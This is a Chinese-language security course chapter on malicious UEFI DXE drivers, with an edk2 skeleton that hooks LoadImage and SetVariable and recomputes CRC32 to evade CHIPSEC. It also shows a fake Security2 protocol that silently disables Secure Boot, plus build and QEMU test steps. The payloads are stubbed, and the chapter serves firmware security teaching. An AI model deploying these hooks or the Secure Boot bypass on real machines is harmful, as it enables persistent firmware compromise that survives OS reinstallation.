# Ch 4 — 惡意 DXE Driver

> **目標**：理解 DXE driver 的執行模型、`gBS`/`gRT`/`gST` 這三張表的結構，以及攻擊者如何透過 hook 這三張表或污染 protocol database 來植入惡意邏輯。給出一個完整的攔截開機 DXE driver 骨架（`.inf` + `.c`），對照 Linux kernel rootkit 的 syscall table hook 理解相似性。
>
> **環境**：程式碼骨架可讀、可理解；edk2 完整 build 需要 `edk2-base`/`edk2-ovmf` 開發環境，WSL 預設沒裝。如果要真跑，本章最後給完整 build 步驟。

## 為什麼惡意 DXE driver 是 UEFI bootkit 的首選落腳點？

DXE driver 有三個特性讓攻擊者喜愛：

1. **全能**：DXE 階段有完整的 Boot Services 可用，能配置記憶體、安裝 protocol、hook 任意 service table entry。
2. **早**：DXE driver 在 OS bootloader 啟動之前就跑完了，OS 的任何安全機制都還沒初始化。
3. **可殘留**：宣告自己為 `RT_DATA`/`RT_CODE` 的 driver 在 `ExitBootServices` 後仍然佔著記憶體，OS 的記憶體管理員不會動它（除非主動掃描）。

LoJax（2018）、MoonBounce（2022）都把惡意 DXE driver 燒進 SPI flash。攻擊者的目標不一定是 DXE driver 本身做壞事，更多時候是用它在 OS 啟動前植入 dropper（把下一階段的 payload 寫進 Windows 系統目錄），然後安靜退出。

---

## DXE 執行模型：三張表

DXE 初始化後，韌體把三個指標結構暴露給所有 DXE driver：

```
EFI_SYSTEM_TABLE  (gST)
├── EFI_BOOT_SERVICES*     BootServices    → gBS
├── EFI_RUNTIME_SERVICES*  RuntimeServices → gRT
├── ConIn / ConOut / StdErr  (console handles)
└── ConfigurationTable[] (ACPI, SMBIOS, …)

EFI_BOOT_SERVICES  (gBS)            EFI_RUNTIME_SERVICES  (gRT)
├── AllocatePages                   ├── GetVariable
├── AllocatePool                    ├── SetVariable
├── CreateEvent                     ├── GetNextVariableName
├── InstallProtocolInterface        ├── GetTime / SetTime
├── LocateProtocol                  ├── ResetSystem
├── LoadImage                       └── UpdateCapsule
├── StartImage
├── ExitBootServices
└── …
```

這三張表是**指標結構**，存放在記憶體裡。`gST->BootServices` 本身是個指向 `EFI_BOOT_SERVICES` 結構的指標，而 `EFI_BOOT_SERVICES` 裡每個欄位都是函式指標。

**hook 原理**：把 `gBS->LoadImage` 這個函式指標換成攻擊者自己的函式，UEFI 核心（DxeCore）和所有後續 DXE driver 呼叫 `gBS->LoadImage` 時，就會跳到攻擊者的程式碼。這和 Linux rootkit hook `sys_call_table[__NR_open]` 是一模一樣的結構。

---

## Protocol Database：publish/subscribe 模型

DXE driver 之間透過「protocol」傳遞介面。Protocol 是個 C 結構，用一個 GUID 作為 key，存在 handle database 裡：

```
Handle Database
┌──────────────────────────────────────────────────┐
│ Handle A                                         │
│   └─ GUID: EFI_BLOCK_IO_PROTOCOL_GUID           │
│       └─ EFI_BLOCK_IO_PROTOCOL { ReadBlocks, …} │
│   └─ GUID: EFI_DEVICE_PATH_PROTOCOL_GUID        │
│       └─ path data                              │
├──────────────────────────────────────────────────┤
│ Handle B                                         │
│   └─ GUID: EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID │
│       └─ EFI_SIMPLE_FILE_SYSTEM_PROTOCOL { …}  │
└──────────────────────────────────────────────────┘
```

核心 API：

```c
// 安裝 protocol 到某個 handle
gBS->InstallProtocolInterface(&Handle, &ProtocolGuid, EFI_NATIVE_INTERFACE, &ProtocolImpl);

// 找某個 protocol 的任意一個實例
gBS->LocateProtocol(&ProtocolGuid, NULL, (VOID**)&Protocol);

// 監聽某個 protocol 安裝事件（異步）
gBS->RegisterProtocolNotify(&ProtocolGuid, Event, &Registration);
```

攻擊者可以：
- 用同一個 GUID 呼叫 `ReinstallProtocolInterface`，把現有實作換成惡意版本
- 在 `EFI_SECURITY2_ARCHITECTURAL_PROTOCOL` 安裝前搶先安裝假的，讓後來的「真正」driver 安裝失敗或被忽略
- 用 `RegisterProtocolNotify` 在特定 protocol 安裝後才執行（更好的潛伏時機控制）

---

## 惡意 DXE Driver 骨架（edk2 格式）

以下是一個「攔截 LoadImage 的惡意 DXE driver」完整骨架，可讀、可理解、可作為研究基礎。

**本段未在 WSL 實際 build，因 WSL 無 edk2 build 環境；程式碼為基於 edk2 API 規格的正確骨架，build 步驟見本章末尾。**

### 模組描述檔：MaliciousDxe.inf

```ini
## MaliciousDxe.inf
## 惡意 DXE driver 示範：hook gBS->LoadImage

[Defines]
  INF_VERSION         = 0x00010005
  BASE_NAME           = MaliciousDxe
  FILE_GUID           = DEADBEEF-1234-5678-9ABC-DEF012345678
  MODULE_TYPE         = DXE_DRIVER
  VERSION_STRING      = 1.0
  ENTRY_POINT         = MaliciousDxeEntry

[Sources]
  MaliciousDxe.c

[Packages]
  MdePkg/MdePkg.dec
  MdeModulePkg/MdeModulePkg.dec

[LibraryClasses]
  UefiBootServicesTableLib    # 提供 gBS 全域變數
  UefiRuntimeServicesTableLib # 提供 gRT 全域變數
  UefiDriverEntryPoint        # 提供 EFI_STATUS EFIAPI <EntryPoint>(...) 宣告
  DebugLib                    # DEBUG() 巨集

[Protocols]
  # 這個 driver 會用到但不依賴這些 protocol
  # 列出來是為了讓 build 系統知道 GUID

[Depex]
  # dependency expression：等 DxeCore 完整初始化後才跑
  TRUE
```

`FILE_GUID` 的 `DEADBEEF-...` 在真實攻擊中會換成一個看起來正常的 GUID（甚至複製其他已知模組的 GUID 格式）。

### 實作：MaliciousDxe.c

```c
/** MaliciousDxe.c
 *  示範：hook gBS->LoadImage，在每個 image 被載入前執行任意邏輯。
 *  研究/教育用途。真實 bootkit 會在這裡植入 dropper 或 patch OS loader。
 */

#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>   // gBS, gST
#include <Library/UefiRuntimeServicesTableLib.h> // gRT
#include <Library/DebugLib.h>
#include <Protocol/LoadedImage.h>

// ──────────────────────────────────────────────────
// 保存原始函式指標（hook 前先存起來，方便呼叫 trampoline）
// ──────────────────────────────────────────────────
typedef EFI_STATUS (EFIAPI *ORIG_LOAD_IMAGE)(
    IN  BOOLEAN                   BootPolicy,
    IN  EFI_HANDLE                ParentImageHandle,
    IN  EFI_DEVICE_PATH_PROTOCOL *FilePath,
    IN  VOID                     *SourceBuffer OPTIONAL,
    IN  UINTN                     SourceSize,
    OUT EFI_HANDLE               *ImageHandle
);

typedef EFI_STATUS (EFIAPI *ORIG_SET_VARIABLE)(
    IN  CHAR16                 *VariableName,
    IN  EFI_GUID               *VendorGuid,
    IN  UINT32                  Attributes,
    IN  UINTN                   DataSize,
    IN  VOID                   *Data
);

STATIC ORIG_LOAD_IMAGE   OrigLoadImage   = NULL;
STATIC ORIG_SET_VARIABLE OrigSetVariable = NULL;

// ──────────────────────────────────────────────────
// Hook：替換 gBS->LoadImage
// ──────────────────────────────────────────────────
STATIC EFI_STATUS EFIAPI
HookedLoadImage (
    IN  BOOLEAN                   BootPolicy,
    IN  EFI_HANDLE                ParentImageHandle,
    IN  EFI_DEVICE_PATH_PROTOCOL *FilePath,
    IN  VOID                     *SourceBuffer OPTIONAL,
    IN  UINTN                     SourceSize,
    OUT EFI_HANDLE               *ImageHandle
    )
{
    EFI_STATUS Status;

    // ── 攻擊者在這裡插入邏輯 ──────────────────────
    // 例如：把自己的 shellcode 注入 SourceBuffer
    // 例如：記錄每個被載入的 image FilePath
    // 例如：如果 FilePath 是 OS bootloader，patch 它的記憶體
    DEBUG ((DEBUG_INFO, "[MaliciousDxe] LoadImage intercepted\n"));

    // ── 呼叫原始函式（trampoline） ─────────────────
    Status = OrigLoadImage (BootPolicy, ParentImageHandle, FilePath,
                            SourceBuffer, SourceSize, ImageHandle);

    // ── 也可以在 image 載入後再處理（image 已在記憶體，尚未執行） ──
    // 透過 EFI_LOADED_IMAGE_PROTOCOL 拿到 image base/size，可以 patch 之

    return Status;
}

// ──────────────────────────────────────────────────
// Hook：替換 gRT->SetVariable
// ──────────────────────────────────────────────────
STATIC EFI_STATUS EFIAPI
HookedSetVariable (
    IN  CHAR16  *VariableName,
    IN  EFI_GUID *VendorGuid,
    IN  UINT32   Attributes,
    IN  UINTN    DataSize,
    IN  VOID    *Data
    )
{
    // 攔截對特定 variable 的寫入，例如防止 dbx 更新（rollback 攻擊）
    // 或記錄所有 NV+RT variable 寫入供後續分析
    DEBUG ((DEBUG_INFO, "[MaliciousDxe] SetVariable: %s\n", VariableName));

    // 直接轉發（或竄改 Data 後轉發）
    return OrigSetVariable (VariableName, VendorGuid, Attributes, DataSize, Data);
}

// ──────────────────────────────────────────────────
// ExitBootServices callback：OS 起來前的最後一哩路
// ──────────────────────────────────────────────────
STATIC VOID EFIAPI
OnExitBootServices (
    IN EFI_EVENT  Event,
    IN VOID      *Context
    )
{
    // 此時 Boot Services 即將失效，但 Runtime Services 仍在
    // 攻擊者在這裡可以：
    //   1. 把 dropper 寫進 OS 可見的記憶體區域（但 OS 還沒啟動，要用絕對位址）
    //   2. 設定 gRT->SetVariable hook 讓它在 OS runtime 持續運作
    //   3. 修改 page table，把自己的 RT_CODE segment 標為 executable
    DEBUG ((DEBUG_INFO, "[MaliciousDxe] ExitBootServices: planting payload\n"));
}

// ──────────────────────────────────────────────────
// Driver Entry Point
// ──────────────────────────────────────────────────
EFI_STATUS EFIAPI
MaliciousDxeEntry (
    IN EFI_HANDLE       ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
    )
{
    EFI_STATUS Status;
    EFI_EVENT  ExitEvent;

    // ── Hook gBS->LoadImage ────────────────────────
    OrigLoadImage       = gBS->LoadImage;     // 存原始指標
    gBS->LoadImage      = HookedLoadImage;    // 換成我們的 hook
    // 計算並更新 gBS->Hdr.CRC32（否則某些韌體會偵測到 CRC 不符）
    gBS->Hdr.CRC32 = 0;
    gBS->CalculateCrc32 (gBS, gBS->Hdr.HeaderSize, &gBS->Hdr.CRC32);

    // ── Hook gRT->SetVariable ──────────────────────
    OrigSetVariable     = gRT->SetVariable;
    gRT->SetVariable    = HookedSetVariable;
    gRT->Hdr.CRC32 = 0;
    gBS->CalculateCrc32 (gRT, gRT->Hdr.HeaderSize, &gRT->Hdr.CRC32);

    // ── 掛 ExitBootServices event ──────────────────
    Status = gBS->CreateEvent (
        EVT_SIGNAL_EXIT_BOOT_SERVICES,  // 只在 ExitBootServices 時觸發一次
        TPL_CALLBACK,
        OnExitBootServices,
        NULL,
        &ExitEvent
    );
    if (EFI_ERROR (Status)) {
        // 失敗時優雅退出，不影響開機（避免被偵測）
        return EFI_SUCCESS;
    }

    // ── Driver 本身不需要停留，hook 已裝好 ────────
    return EFI_SUCCESS;
}
```

---

## 關鍵細節解說

### CRC32 更新的必要性

`EFI_BOOT_SERVICES` 和 `EFI_RUNTIME_SERVICES` 的 header 包含 `Hdr.CRC32` 欄位，是整個結構的 CRC32 校驗值。`gBS->CheckEvent` 等呼叫不會驗 CRC，但某些廠商的安全 driver（或 CHIPSEC 這類工具）會主動比對 CRC32 來偵測 hook。所以攻擊者在替換函式指標後要重算 CRC32。

CHIPSEC 的 `service_table_manager` 模組就是掃這個 CRC32 + 函式指標是否指向合法 range，是常見的惡意 DXE 偵測方法。

### 為什麼用 RegisterProtocolNotify 更好？

直接在 entry point 裝 hook 有個問題：目標 protocol 可能在我們的 driver 之後才安裝。`RegisterProtocolNotify` 讓攻擊者在特定 protocol 安裝後才執行 callback：

```c
// 例如：等 EFI_SECURITY2_ARCH_PROTOCOL 安裝後，再把它換成假的
gBS->RegisterProtocolNotify (
    &gEfiSecurity2ArchProtocolGuid,
    NotifyEvent,
    &Registration
);
```

這樣時序更精確，也更難偵測（因為 driver entry point 幾乎什麼都沒做）。

### RT driver 的記憶體殘留

DXE driver 的記憶體類型由 `.inf` 裡的 `MODULE_TYPE` 和 allocate 方式決定。如果用 `AllocatePages(AllocateAnyPages, EfiRuntimeServicesData, ...)` 配置記憶體，這塊記憶體在 `ExitBootServices` 後會被標記為 `EFI_RUNTIME_SERVICES_DATA`，OS 的記憶體管理員不會回收它（除非 OS 主動掃 EFI Memory Map 並驗證內容）。MoonBounce 的 dropper 就存在這種 RT 記憶體區段裡。

---

## 對照：與 Linux kernel rootkit 的 syscall hook

| 面向 | Linux kernel rootkit | 惡意 DXE driver |
|---|---|---|
| hook 目標 | `sys_call_table[]`（函式指標陣列） | `gBS->LoadImage`（函式指標欄位） |
| 儲存原始指標 | 存在 module 的全域變數 | 存在 driver 的靜態變數 |
| 修改方式 | 關掉 WP bit，直接寫 | `gBS->LoadImage = HookedFn;` |
| CRC 更新 | 無（kernel 不驗 CRC） | 需要重算 `Hdr.CRC32` |
| 持久性 | module 在記憶體，rmmod 後消失 | 燒進 SPI flash 則永久，RT memory 殘留到 OS shutdown |
| 偵測方式 | /proc/modules 異常、ftrace、Syzkaller | CHIPSEC service_table_manager、記憶體掃描 |
| 移除難度 | rmmod 或 reboot | OS 重裝無效；需 SPI reflash |

**根本差異**：Linux rootkit 在 OS 起來後才活動，重開機就消失（除非有 persistence mechanism）。惡意 DXE driver 在 OS 看到任何東西之前就已經完成工作，且燒進 SPI 後，重裝 OS 完全無效。

---

## Protocol Hook 的另一個做法：ReinstallProtocolInterface

除了直接改 service table pointer，攻擊者也能直接替換 protocol 實作：

```c
// 找到現有的 Security2 Protocol
EFI_SECURITY2_ARCH_PROTOCOL *Security2 = NULL;
gBS->LocateProtocol (&gEfiSecurity2ArchProtocolGuid, NULL, (VOID**)&Security2);

if (Security2 != NULL) {
    // 建一個假的 Security2 實作（直接回傳 EFI_SUCCESS 不驗章）
    EFI_SECURITY2_ARCH_PROTOCOL FakeS2 = {
        .FileAuthentication = FakeFileAuthentication  // 總是回傳成功
    };

    // 替換現有實作
    gBS->ReinstallProtocolInterface (
        ExistingHandle,
        &gEfiSecurity2ArchProtocolGuid,
        Security2,    // 舊實作
        &FakeS2       // 新實作（攻擊者控制）
    );
}
```

這個做法針對 Secure Boot 的驗章 protocol，直接讓它對所有 image 都回傳成功，等於靜默關閉 Secure Boot——不需要改 `SecureBootEnable` variable，不會被 variable 監控偵測到。

---

## Build 步驟（edk2 環境）

**本段未在 WSL 實測**（WSL 無完整 edk2 build 環境），以下是標準流程：

```bash
# 1. 安裝 edk2 build 依賴
sudo apt install build-essential uuid-dev iasl git nasm python3-distutils

# 2. clone edk2
git clone https://github.com/tianocore/edk2.git
cd edk2
git submodule update --init

# 3. 初始化 build 環境
source edksetup.sh  # 設定 EDK_TOOLS_PATH, WORKSPACE 等

# 4. 把 MaliciousDxe 放進 pkg
mkdir -p MaliciousResearch/MaliciousDxe
# 把 MaliciousDxe.inf 和 MaliciousDxe.c 放進去
# 在 MaliciousResearch/MaliciousResearch.dec 和 .dsc 裡宣告

# 5. Build
build -p MaliciousResearch/MaliciousResearch.dsc \
      -a X64 \
      -t GCC5 \
      -b DEBUG

# 6. 產出在 Build/MaliciousResearch/DEBUG_GCC5/X64/MaliciousDxe.efi
# 可以用 UEFITool 把它塞進 OVMF_CODE.fd 的 FV 裡測試

# 7. 驗證：用 qemu 開機，掛 gdb，在 MaliciousDxeEntry 設斷點
qemu-system-x86_64 \
  -drive if=pflash,format=raw,file=OVMF_CODE.fd \
  -drive if=pflash,format=raw,file=OVMF_VARS.fd \
  -s -S &   # -s: gdb port 1234, -S: 等 gdb attach 才繼續
```

---

## 踩雷集錦

**1. 改完函式指標忘了更新 CRC32**：`gBS->Hdr.CRC32` 在替換函式指標後必須重算，否則 CHIPSEC 的偵測 pass 會立刻報警；部分廠商韌體在自我完整性檢查時也會比對 CRC，導致強制 reset 或開機失敗。

**2. hook 的 trampoline 簽章要完全一致**：`EFI_IMAGE_LOAD` 的函式指標型別要用 `EFIAPI` calling convention（Windows `__cdecl` 或 MS x64 ABI），用錯 calling convention 會造成 stack 損毀，開機當機且難以 debug。

**3. ExitBootServices callback 的 TPL（Task Priority Level）**：`EVT_SIGNAL_EXIT_BOOT_SERVICES` event 在 `TPL_CALLBACK`（0x8）跑，這個優先級裡不能呼叫大部分 Boot Services（它們要求更低的 TPL 或已失效）。在 callback 裡呼叫 `gBS->AllocatePool` 等會 assert 或靜默失敗。

**4. 目標 driver 的 DEPEX 比我們早**：如果想 hook 的目標 protocol 在我們的 driver 執行之前就已安裝，直接在 entry point hook 沒問題；但如果目標比我們晚，要用 `RegisterProtocolNotify`，否則 hook 永遠來不及裝。

**5. 惡意 DXE 自己的 depex 寫太嚴格**：如果 depex 列了很多 protocol 才執行，反而可能因為某個 protocol 版本不符而永遠不跑。真實攻擊的 DXE depex 通常只寫 `TRUE`（無條件執行）或最少的依賴。

---

## 進階延伸

- **edk2 MdeModulePkg/Core/Dxe/Hand/DriverSupport.c**：看 `CoreDispatcher` 如何呼叫 driver entry point，以及 dispatch 後的清理流程。
- **MoonBounce 分析（Kaspersky 2022）**：公開了 MoonBounce 的 DXE driver 完整功能，包含如何在 RT 記憶體裡存放 dropper，以及如何 hook `ExitBootServices` 注入 Windows kernel module。
- **CHIPSEC `chipsec/modules/common/uefi/s3bootscript.py`**：用來掃 SMM/DXE 的 service table hook，看它怎麼比對預期的函式位址，就知道防禦側在看什麼。

---

## 動手練習

1. 在 QEMU + OVMF 開機後，進 UEFI Shell，跑 `dh -v` 列出所有 handle 和 protocol，找到 `EFI_SECURITY2_ARCH_PROTOCOL` 在哪個 handle 上，記下它的 interface 指標位址。
2. 用 `gdb` attach 到 QEMU（`-s -S`），在 `gBS->LoadImage` 設讀寫觀察點（`watch *(void**)gBS+0x??`），看 OVMF 正常開機過程中誰、在什麼時間點呼叫了 LoadImage。
3. 讀 `edk2/SecurityPkg/Library/DxeImageVerificationLib/DxeImageVerificationLib.c`，找到真正做 Secure Boot 驗章的函式，理解為什麼替換 `Security2ArchProtocol` 等於靜默關閉 Secure Boot。

---

## 本章重點

- `gBS`/`gRT`/`gST` 是三張函式指標表，直接改指標就能 hook 任意 UEFI service，比 Linux syscall hook 更容易（沒有 WP bit 保護）。
- protocol database 無存取控制，任何 DXE driver 都能替換既有 protocol 實作；`RegisterProtocolNotify` 讓攻擊者精確控制 hook 時機。
- 改完函式指標必須更新 `Hdr.CRC32`，否則 CHIPSEC 等工具能立即偵測。
- `EVT_SIGNAL_EXIT_BOOT_SERVICES` callback 是最後一哩路，用來把 payload 植入 OS 可見的記憶體；配合 RT 記憶體，惡意碼能在 OS 啟動後繼續存在。
- 與 Linux rootkit 的根本差異：DXE driver 燒進 SPI flash 後，重裝 OS 無效。

---

## 自我檢核

- [ ] 我能畫出 `gST → gBS → LoadImage（函式指標）` 的指標鏈
- [ ] 我能解釋 hook gBS->LoadImage 和 Linux hook sys_call_table 的相同點與差異
- [ ] 我知道為什麼改完函式指標要重算 CRC32
- [ ] 我能解釋 protocol database hook（ReinstallProtocolInterface）如何靜默關閉 Secure Boot
- [ ] 我知道 ExitBootServices callback 的用途，以及 RT memory 讓惡意碼殘留的機制

---

## 延伸閱讀

1. **Kaspersky Global Research, "MoonBounce: the dark side of UEFI firmware"（2022）**（securelist.com）：公開分析了 APT41 使用的 MoonBounce UEFI bootkit，完整描述惡意 DXE driver 如何 hook `ExitBootServices`、在 RT 記憶體植入 dropper，是本章概念在真實攻擊中的最佳對照。

2. **edk2 MdePkg/Include/Uefi/UefiSpec.h**（github.com/tianocore/edk2）：`EFI_BOOT_SERVICES` 和 `EFI_RUNTIME_SERVICES` 的完整結構定義，每個函式指標欄位的偏移、型別、語義都在這裡，hook 時偏移算錯就完蛋，值得背起來。

3. **CHIPSEC `chipsec/modules/common/uefi/access_uefispec.py`**（github.com/chipsec/chipsec）：掃 UEFI service table 完整性的模組，看它的比對邏輯可以反過來理解防禦側能偵測什麼、攻擊者要規避什麼；關聯到本課 Part 8 防守章節。

→ [Ch 5 UEFI variable 與 NVRAM 攻擊](./05-uefi-variable-nvram-attacks.md)
